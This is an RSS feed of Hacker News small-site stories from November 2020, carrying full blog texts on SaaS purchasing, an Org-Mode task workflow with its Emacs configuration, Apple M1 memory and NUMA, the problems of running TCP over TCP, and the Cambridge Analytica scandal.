<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 14 Nov 2020 20:18:09 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 14 Nov 2020 20:18:09 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Org-Mode Workflow: Task Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081372">thread link</a>) | @mromanuk
<br/>
November 13, 2020 | https://whhone.com/posts/org-mode-task-management/ | <a href="https://web.archive.org/web/*/https://whhone.com/posts/org-mode-task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))
     <span>nil</span>)))
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Thanks for <a href="https://www.reddit.com/r/orgmode/comments/jmf8dw/an_orgmode_workflow_for_task_management/gavkv1r/?context=3">this comment</a> in Reddit. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>There will be another post for Org-Mode note-taking workflow. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		
	</div></div>]]>
            </description>
            <link>https://whhone.com/posts/org-mode-task-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081372</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon, Xeon Phi, and Amigas]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080913">thread link</a>) | @ingve
<br/>
November 13, 2020 | https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>
	</div></div>]]>
            </description>
            <link>https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080913</guid>
            <pubDate>Fri, 13 Nov 2020 10:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on the Cambridge Analytica Scandal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25080591">thread link</a>) | @sobradob
<br/>
November 13, 2020 | http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/ | <a href="https://web.archive.org/web/*/http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <p><span>Nov 7, 2020 · 6 minute read
    
    <br>
    <a href="http://boazsobrado.com/categories/facebook">Facebook</a><a href="http://boazsobrado.com/categories/advertising">Advertising</a><a href="http://boazsobrado.com/categories/trump">Trump</a><a href="http://boazsobrado.com/categories/cambridge-analytica">Cambridge Analytica</a>
    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

  </div>
  
</div></div>]]>
            </description>
